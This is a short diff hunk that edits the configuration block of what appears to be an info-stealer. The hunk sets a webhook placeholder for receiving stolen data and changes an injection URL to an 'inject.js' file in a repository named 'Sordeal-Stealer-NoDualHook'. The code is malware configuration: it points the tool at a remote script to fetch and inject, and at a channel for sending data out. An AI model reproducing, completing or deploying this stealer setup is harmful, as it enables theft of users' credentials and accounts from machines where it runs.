@@ -62,7 +62,7 @@ coresecretname = thissecretcore.text
 __config__ = {
     # Basic Options
     "websecret": "%WEBHOOK_HERE%",
-    "inject_url_please": f"https://raw.githubusercontent.com/{mynameis}/{mynameis}-Injection/main/index.js",
+    "inject_url_please": "https://raw.githubusercontent.com/Inplex-sys/Sordeal-Stealer-NoDualHook/main/inject.js",
     "customcreator": "%PC_CREATOR%",
     "customuser": "%USER_CREATOR%",
 
